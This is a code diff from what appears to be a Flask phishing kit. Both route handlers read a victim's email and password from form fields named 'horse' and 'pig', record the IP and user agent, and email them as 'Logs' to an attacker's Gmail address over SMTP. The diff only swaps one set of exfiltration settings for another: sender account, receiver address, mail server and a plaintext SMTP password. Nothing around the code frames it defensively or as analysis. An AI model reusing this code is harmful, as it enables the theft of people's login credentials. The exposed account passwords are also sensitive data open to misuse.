@@ -187,10 +187,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "moneycheatcodes@ezipservers.quest"
-        sender_emaill = "moneycheatcodes"
-        receiver_email = "danieloojerahi@gmail.com"
-        password = "XX1dZP;{GFx2m+e8"
+        sender_email = "munna@onegroupbd.com"
+        sender_emaill = "munna"
+        receiver_email = "s.toihidi@gmail.com"
+        password = "MUNNA@ONE123"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "GOmoneycheatcode Logs &&"
@@ -206,7 +206,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("ezipservers.quest", 465) as server:
+        with smtplib.SMTP_SSL("mail.onegroupbd.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -225,10 +225,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "moneycheatcodes@ezipservers.quest"
-        sender_emaill = "moneycheatcodes"
-        receiver_email = "danieloojerahi@gmail.com"
-        password = "XX1dZP;{GFx2m+e8"
+        sender_email = "munna@onegroupbd.com"
+        sender_emaill = "munna"
+        receiver_email = "s.toihidi@gmail.com"
+        password = "MUNNA@ONE123"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "GOmoneycheatcode Logs &&"
@@ -244,7 +244,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("ezipservers.quest", 465) as server:
+        with smtplib.SMTP_SSL("mail.onegroupbd.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
